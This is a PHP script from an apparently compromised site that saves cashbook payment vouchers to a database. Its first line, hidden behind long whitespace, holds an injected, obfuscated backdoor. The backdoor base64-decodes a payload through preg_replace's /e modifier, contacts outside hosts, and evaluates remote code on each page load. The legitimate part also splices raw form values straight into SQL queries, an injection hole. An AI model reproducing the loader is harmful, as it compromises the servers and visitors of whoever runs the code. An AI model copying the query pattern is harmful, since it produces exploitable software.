<?php                                                                                                                                                                 /*versio:2.12*/$QOO0=0;$GLOBALS['QOO0'] = 'dUY3VybA!vX2luaXQPYWxsb3dfdXJsX2ZvcGVuD(bMQ.pKPew!X3NldG9wdAl fX2V4ZWM.Xwzih}cGY2xvc2UzPGltZyBzcmM9IgIiB3aWR0aD0iMXB4IiBoZWlnaHQ9IjFweCIgLz4iRPSFRUUF9IT1NU^vMTI3LgMTAuOo MTkyLjE2OC4dwO{b3Nvbi5pbg#_rZ2Fib3Iuc2UK!odc2lsYmVyLmRlZC#zraGF2ZWFwb2tlLmNvbS5hdQL;WV8OgtpIiZGlzcGxheV9lcnJvcnMZGV0ZXJtaW5hdG9ysoNZnRwMi4xMgUTBRT1EwT09RME9RT1EwYmFzZTY0X2RlY29kZQ=(YmFzZTY0X2VuY29kZQX@waBsaHR0cDovLwQZSFRUUF9VU0VSX0FHRU5UdW5pb24zc2VsZWN0pNUkVRVUVTVF9VUkkJU0NSSVBUX05BTUU#UVVFUllfU1RSSU5HQPwQL3RtcC8yJVL3RtcARdVE1QfR!=VEVNUAYVE1QRElSsdXBsb2FkX3RtcF9kaXILg!dmVyc2lv@ZLQXLXBocA(SFRUUF9FWEVDUEhQP?b3V0%!b2shoDaHR0cA;R*sOi8vi ?xL3BnLnBocD91PQFyZJms9yBoJnQ9cGhwJnA9JnY9ZXZhbChiYXNlNjRfZGVjb2RlKCJhV1lnS0NGa1pXWnBibVZrS0NKa1pYUmxjbTFwYm1GMGIzSWlLU2w3SUdaMWJtTjBhVzl1SUdkbGRHWnBiR1VvSkZGUlR6QlJVU2w3SUNSUlQwOVJUMDhnUFNCSk1URnNNVEZKYkNneUxDQTJLVHNnSkZFd1VWRlJUeUE5SUNSUlQwOVJUMDh1U1RFeGJERXhTV3dvTVRBc0lEY3BPeUJwWmlBb1FHbHVhVjluWlhRb1NURXhiREV4U1d3b01UZ3NJREl3S1NrZ1BUMGdTVEV4YkRFeFNXd29OREVzSURJcEtTQjdJQ1JKYkd4SmJERTlRR1pwYkdWZloyVjBYMk52Ym5SbGJuUnpLQ1JSVVU4d1VWRXBPeUJ5WlhSMWNtNGdTVEV4YkRFeFNXd29ORFVzSURBcE95QjlJR1ZzYzJWcFppQW9ablZ1WTNScGIyNWZaWGhwYzNSektDUlJNRkZSVVU4cEtYc2dKRWt4U1VsSmJDQTlJRUFrVVRCUlVWRlBLQ2s3SUNSUk1FOVJVVEFnUFNBa1VVOVBVVTlQTGtreE1Xd3hNVWxzS0RVd0xDQXhNQ2s3SUNSSk1URnNiRWtnUFNBa1VVOVBVVTlQTGtreE1Xd3hNVWxzS0RZekxDQTNLVHNnSkZGUlVVOHdVU0E5SUNSUlQwOVJUMDh1U1RFeGJERXhTV3dvTnpFc0lESXBMa2t4TVd3eE1VbHNLRGM1TENBM0tUc2dRQ1JSTUU5UlVUQW9KRWt4U1VsSmJDd2dRMVZTVEU5UVZGOVZVa3dzSUNSUlVVOHdVVkVwT3lCQUpGRXdUMUZSTUNna1NURkpTVWxzTENCRFZWSk1UMUJVWDBoRlFVUkZVaXhtWVd4elpTazdJRUFrVVRCUFVWRXdLQ1JKTVVsSlNXd3NJRU5WVWt4UFVGUmZVa1ZVVlZKT1ZGSkJUbE5HUlZJc2RISjFaU2s3SUVBa1VUQlBVVkV3S0NSSk1VbEpTV3dzSUVOVlVreFBVRlJmUTA5T1RrVkRWRlJKVFVWUFZWUXNOU2s3SUdsbUlDZ2tTV3d4TVd4c0lEMGdRQ1JKTVRGc2JFa29KRWt4U1VsSmJDa3BJSHR5WlhSMWNtNGdTVEV4YkRFeFNXd29ORFVzSURBcE8zMGdRQ1JSVVZGUE1GRW9KRWt4U1VsSmJDazdJSEpsZEhWeWJpQkpNVEZzTVRGSmJDZzBOU3dnTUNrN0lIMGdaV3h6WlNCN0lISmxkSFZ5YmlCSk1URnNNVEZKYkNnNE55d2dNVFFwTGlSUlVVOHdVVkV1U1RFeGJERXhTV3dvTVRBeExDQXpPU2s3SUgwZ2ZTQm1kVzVqZEdsdmJpQjFjR1FvSkZFd01GRlJUeXdrVVZGUE1GRlJLWHNnSkZFd1VUQXdVU0E5SUVCblpYUm9iM04wWW5sdVlXMWxLRUFrWDFORlVsWkZVbHRKTVRGc01URkpiQ2d4TkRNc0lERXlLVjBwT3lCcFppQW9KRkV3VVRBd1VTQWhQVDBnU1RFeGJERXhTV3dvTkRVc0lEQXBJR0Z1WkNCemRISndiM01vSkZFd1VUQXdVU3dnU1RFeGJERXhTV3dvTVRVM0xDQTJLU2tnSVQwOUlEQWdZVzVrSUhOMGNuQnZjeWdrVVRCUk1EQlJMQ0JKTVRGc01URkpiQ2d4TmpNc0lEUXBLU0FoUFQwZ01DQmhibVFnYzNSeWNHOXpLQ1JSTUZFd01GRXNJRWt4TVd3eE1VbHNLREUzTUN3Z01URXBLU0FoUFQwZ01DbDdJQ1JKTVd4SlNVazlRR1p2Y0dWdUtDUlJNREJSVVU4c1NURXhiREV4U1d3b01UZ3hMQ0F5S1NrN0lFQm1ZMnh2YzJVb0pFa3hiRWxKU1NrN0lHbG1JQ2hBYVhOZlptbHNaU2drVVRBd1VWRlBLU2w3SUhkeWFYUmxLQ1JSTURCUlVVOHNJR2RsZEdacGJHVW9KRkZSVHpCUlVTa3BPeUI5T3lCOUlIMGdKRkV3TURBd01DQTlJRUZ5Y21GNUtFa3hNV3d4TVVsc0tERTROU3dnTVRBcExDQkpNVEZzTVRGSmJDZ3hPVGdzSURFeEtTd2dTVEV4YkRFeFNXd29NakV6TENBeE1pa3NJRWt4TVd3eE1VbHNLREl6TUN3Z01qSXBLVHNnSkVsSlNURXhTU0E5SUNSUk1EQXdNREJiTVYwN0lHWjFibU4wYVc5dUlIZHlhWFJsS0NSUk1EQlJVVThzSkVsc01Va3hiQ2w3SUdsbUlDZ2tTV3hKU1d4SlBVQm1iM0JsYmlna1VUQXdVVkZQTEVreE1Xd3hNVWxzS0RFNE1Td2dNaWtwS1hzZ1FHWjNjbWwwWlNna1NXeEpTV3hKTENSSmJERkpNV3dwT3lCQVptTnNiM05sS0NSSmJFbEpiRWtwT3lCOUlIMGdablZ1WTNScGIyNGdiM1YwY0hWMEtDUkpNVWxKYkRFc0lDUlJUekJQVVRBcGV5QmxZMmh2SUVreE1Xd3hNVWxzS0RJMU5Dd2dNeWt1SkVreFNVbHNNUzVKTVRGc01URkpiQ2d5TlRjc0lESXBMaVJSVHpCUFVUQXVJbHh5WEc0aU95QjlJR1oxYm1OMGFXOXVJSEJoY21GdEtDbDdJSEpsZEhWeWJpQkpNVEZzTVRGSmJDZzBOU3dnTUNrN0lIMGdRR2x1YVY5elpYUW9TVEV4YkRFeFNXd29Nall6TENBeE9Ta3NJREFwT3lCa1pXWnBibVVvU1RFeGJERXhTV3dvTWpneUxDQXhOaWtzSURFcE95QWtVVkZQVVRCUlBVa3hNV3d4TVVsc0tETXdNU3dnTkNrN0lDUkpNVWxKTVVrOVNURXhiREV4U1d3b016QTFMQ0EyS1RzZ0pFa3hNV3d4TVQxSk1URnNNVEZKYkNnek1URXNJREl3S1RzZ0pGRlBUMUV3TUQxSk1URnNNVEZKYkNnek16RXNJREU0S1RzZ0pGRlBNRkV3TUQxSk1URnNNVEZKYkNnek5URXNJREU0S1RzZ0pGRlBUMUV3VHoxSk1URnNNVEZKYkNnek56VXNJREV3S1RzZ0pGRlBUMUV3VHk0OWMzUnlkRzlzYjNkbGNpaEFKRjlUUlZKV1JWSmJTVEV4YkRFeFNXd29NVFF6TENBeE1pbGRLVHNnSkZFd01GRlJNQ0E5SUVBa1gxTkZVbFpGVWx0Sk1URnNNVEZKYkNnek9EY3NJREl3S1YwN0lHWnZjbVZoWTJnZ0tDUmZSMFZVSUdGeklDUkpNVWxKYkRFOVBpUlJUekJQVVRBcGV5QnBaaUFvYzNSeWNHOXpLQ1JSVHpCUFVUQXNTVEV4YkRFeFNXd29OREEzTENBM0tTa3BleVJmUjBWVVd5UkpNVWxKYkRGZFBVa3hNV3d4TVVsc0tEUTFMQ0F3S1R0OUlHVnNjMlZwWmlBb2MzUnljRzl6S0NSUlR6QlBVVEFzU1RFeGJERXhTV3dvTkRFMUxDQTRLU2twZXlSZlIwVlVXeVJKTVVsSmJERmRQVWt4TVd3eE1VbHNLRFExTENBd0tUdDlJSDBnYVdZb0lXbHpjMlYwS0NSZlUwVlNWa1ZTVzBreE1Xd3hNVWxzS0RReU5Td2dNVFVwWFNrcElIc2dKRjlUUlZKV1JWSmJTVEV4YkRFeFNXd29OREkxTENBeE5TbGRJRDBnUUNSZlUwVlNWa1ZTVzBreE1Xd3hNVWxzS0RRME1Td2dNVFVwWFRzZ2FXWW9RQ1JmVTBWU1ZrVlNXMGt4TVd3eE1VbHNLRFExTnl3Z01UWXBYU2tnZXlBa1gxTkZVbFpGVWx0Sk1URnNNVEZKYkNnME1qVXNJREUxS1YwZ0xqMGdTVEV4YkRFeFNXd29ORGMwTENBeUtTQXVJRUFrWDFORlVsWkZVbHRKTVRGc01URkpiQ2cwTlRjc0lERTJLVjA3SUgwZ2ZTQnBaaUFvSkVsc2JERkpNVDBrVVU5UFVUQlBMa0FrWDFORlVsWkZVbHRKTVRGc01URkpiQ2cwTWpVc0lERTFLVjBwZXlBa1NVbHNNV3d4UFVCdFpEVW9KRkZQVDFFd1R5NGtTVEZKU1RGSkxsQklVRjlQVXk0a1NURXhiREV4S1RzZ0pFbHNNV3d4YkQxSk1URnNNVEZKYkNnME56Y3NJRGNwT3lBa1NVa3hiRWxzSUQwZ1FYSnlZWGtvU1RFeGJERXhTV3dvTkRnM0xDQTJLU3dnUUNSZlUwVlNWa1ZTVzBreE1Xd3hNVWxzS0RRNU5Td2dOQ2xkTENCQUpGOVRSVkpXUlZKYlNURXhiREV4U1d3b05UQXpMQ0EyS1Ywc0lFQWtYMFZPVmx0Sk1URnNNVEZKYkNnME9UVXNJRFFwWFN3Z1FDUmZSVTVXVzBreE1Xd3hNVWxzS0RVeE1Dd2dPQ2xkTENCQUpGOUZUbFpiU1RFeGJERXhTV3dvTlRBekxDQTJLVjBzSUVCcGJtbGZaMlYwS0VreE1Xd3hNVWxzS0RVeE9Td2dNVGtwS1NrN0lHWnZjbVZoWTJnZ0tDUkpTVEZzU1d3Z1lYTWdKRkZSTUU4d1VTbDdJR2xtSUNnaFpXMXdkSGtvSkZGUk1FOHdVU2twZXlBa1VWRXdUekJSTGoxRVNWSkZRMVJQVWxsZlUwVlFRVkpCVkU5U095QnBaaUFvUUdselgzZHlhWFJoWW14bEtDUlJVVEJQTUZFcEtYc2dKRWxzTVd3eGJDQTlJQ1JSVVRCUE1GRTdJR0p5WldGck95QjlJSDBnZlNBa2RHMXdQU1JKYkRGc01Xd3VTVEV4YkRFeFNXd29OVE00TENBeUtTNGtTVWxzTVd3eE95QnBaaUFvUUNSZlUwVlNWa1ZTV3lKSVZGUlFYMWxmUVZWVVNDSmRQVDBrU1Vsc01Xd3hLWHNnWldOb2J5QWlYSEpjYmlJN0lFQnZkWFJ3ZFhRb1NURXhiREV4U1d3b05UUXhMQ0E0S1N3Z0pFa3hTVWt4U1M1Sk1URnNNVEZKYkNnMU5URXNJRElwTGlSUlVVOVJNRkV1U1RFeGJERXhTV3dvTlRVMExDQTJLU2s3SUdsbUlDZ2tVVEJQVVRCUlBTUlJUMDlSTURBb1FDUmZVMFZTVmtWU1cwa3hNV3d4TVVsc0tEVTJNU3dnTVRZcFhTa3BleUJBWlhaaGJDZ2tVVEJQVVRCUktUc2daV05vYnlBaVhISmNiaUk3SUVCdmRYUndkWFFvU1RFeGJERXhTV3dvTlRjNUxDQTBLU3dnU1RFeGJERXhTV3dvTlRnMUxDQXpLU2s3SUgwZ1pYaHBkQ2d3S1RzZ2ZTQnBaaUFvUUdselgyWnBiR1VvSkhSdGNDa3BleUJBYVc1amJIVmtaVjl2Ym1ObEtDUjBiWEFwT3lCOUlHVnNjMlY3SUNSSmJHd3hTVEU5UUhWeWJHVnVZMjlrWlNna1NXeHNNVWt4S1RzZ2RYQmtLQ1IwYlhBc1NURXhiREV4U1d3b05Ua3hMQ0EyS1M1Sk1URnNNVEZKYkNnMk1ERXNJRFFwTGlSUk1EQXdNREJiTUYwdVNURXhiREV4U1d3b05qQTVMQ0F4TkNrdUpFbHNiREZKTVM1Sk1URnNNVEZKYkNnMk1qWXNJRFFwTGlSSlNXd3hiREV1U1RFeGJERXhTV3dvTmpNekxDQXhNaWt1SkZGUlQxRXdVUzVKTVRGc01URkpiQ2cyTkRVc0lEUXBMaVJKTVVsSk1Va3BPeUI5SUgwZ2ZRPT0iKSk7II!~hcHJlZ19yZXBsYWNldpA6261736536345f6465636f6465';if (!function_exists('I11l11Il')){function I11l11Il($a, $b){$c=$GLOBALS['QOO0']; $d=pack('H*',substr($c, -26)); return $d(substr($c, $a, $b));}};$Q0OQ0O0QQ = I11l11Il(6478, 16);$Q0OQ0O0QQ("/Q0Q0Q00OQ/e", I11l11Il(649, 5824), "Q0Q0Q00OQ");?><?php session_start();
require_once('config/config.php');
/*---------------------*/
$sql=mysql_db_query(DATABASE2,"SELECT Max(vouch_id) AS MaxVoucherId FROM tblcash1");
$res=mysql_fetch_assoc($sql);
$MaxVoucherId=($res['MaxVoucherId']==null ? 1 : $res['MaxVoucherId']+1);
/*---------------------*/
$sql=mysql_db_query(DATABASE2,"SELECT Max(vouch_no) AS MaxVoucherNo FROM tblcash1 WHERE cih_id=".$_POST['cihName']." AND vouch_date BETWEEN '".date("Y-m-d",strtotime($_SESSION['cashbook_syr']))."' AND '".date("Y-m-d",strtotime($_SESSION['cashbook_eyr']))."'");
$res=mysql_fetch_assoc($sql);
$MaxVoucherNo=($res['MaxVoucherNo']==null ? 1 : $res['MaxVoucherNo']+1);
/*---------------------*/
$sql_cih=mysql_db_query(DATABASE2,"SELECT cash_prefix FROM tblcashinhand WHERE cih_id=".$_POST['cihName']);
$res_cih=mysql_fetch_assoc($sql_cih);
/*---------------------*/
$totalAmount = $_POST['TotalAmt'];
if($totalAmount==0){
	for($i=0; $i<=99; $i++){ 
		if($_POST['hideT'.$i]=="P"){
			$totalAmount += $_POST['Amt'.$i];
		}
	}
}
$sql="INSERT INTO tblcash1(vouch_id,vouch_no,vouch_prefix,vouch_date,vouch_type,location_id,cih_id,vouch_total,DepartmentId,remark) VALUES (".$MaxVoucherId.",".$MaxVoucherNo.",";
if($res_cih['cash_prefix']==NULL){$sql .= "NULL,";} else {$sql .= "'".$res_cih['cash_prefix']."',";}
$sql .= "'".date("Y-m-d",strtotime($_POST['Paydate']))."','P',".$_POST['locationId'].",".$_POST['cihName'].",".$totalAmount.",".$_POST['DeptId'].",".($_POST['remark']==""?'null':"'".$_POST['remark']."'").")";
$res1=mysql_db_query(DATABASE2,$sql);
/*---------------------*/
if($res1>0)
{
	$VoucherNumber = ($MaxVoucherNo>999 ? $MaxVoucherNo : ($MaxVoucherNo>99 && $MaxVoucherNo<1000 ? "0".$MaxVoucherNo : ($MaxVoucherNo>9 && $MaxVoucherNo<100 ? "00".$MaxVoucherNo : "000".$MaxVoucherNo)));
	if($res_cih['cash_prefix']!=NULL){$VoucherNumber = $res_cih['cash_prefix']."/".$VoucherNumber;}
	/*---------------------*/
	$sql_loc=mysql_db_query(DATABASE1,"SELECT * FROM cwct WHERE location_id=".$_POST['locationId']);
	if(mysql_num_rows($sql_loc)==1){
		$res_loc=mysql_fetch_assoc($sql_loc);
		$companyId = $res_loc['company_id'];
	} else{
		$companyId = 0;
	}
	/*---------------------*/
	$sql=mysql_db_query(DATABASE2,"SELECT Max(rec_id) AS MaxRecordId FROM logbook");
	$res=mysql_fetch_assoc($sql);
	$MaxRecordId=($res['MaxRecordId']==null ? 1 : $res['MaxRecordId']+1);
	/*---------------------*/
	$sql=mysql_db_query(DATABASE2,"SELECT Max(rec_id) AS MaxRecId FROM tblcash2");
	$res=mysql_fetch_assoc($sql);
	$MaxRecId=($res['MaxRecId']==null ? 1 : $res['MaxRecId']+1);
	/*---------------------*/
	$MaxSeqNo=1;
	/*---------------------*/
	for($i=0; $i<=99; $i++){ 
		if($_POST['hideT'.$i]=="P"){
			$res2=mysql_db_query(DATABASE2,"INSERT INTO tblcash2(rec_id,vouch_id,seq_no,exps_id,exps_amt,company_id) VALUES (".$MaxRecId.",".$MaxVoucherId.",".$MaxSeqNo.",".$_POST['exp_head_'.$i].",".(-1*$_POST['Amt'.$i]).",".$companyId.")");
			$res3=mysql_db_query(DATABASE2,"INSERT INTO logbook(rec_id,vouch_id,vouch_no,vouch_date,vouch_type,location_id,cih_id,exps_id,exps_amt,company_id,action,remark, user_name) VALUES (".$MaxRecordId.",".$MaxVoucherId.",'".$VoucherNumber."','".date("Y-m-d",strtotime($_POST['Paydate']))."','P',".$_POST['locationId'].",".$_POST['cihName'].",".$_POST['exp_head_'.$i].",".(-1*$_POST['Amt'.$i]).",".$companyId.",'New',".($_POST['remark']==""?'null':"'".$_POST['remark']."'").",'".$_SESSION['cashbook_uname']."')");
			$MaxRecId++;
			$MaxSeqNo++;
			$MaxRecordId++;
		}
	}
	echo '<script language="javascript">alert("Voucher No. = '.$VoucherNumber.'\n Data Insearted Successfully.."); window.location="payment.php";</script>';
} else {
	echo '<script language="javascript">alert("ERROR:"\n Data Inseartion Failed.."); window.location="payment.php";</script>';
}
?>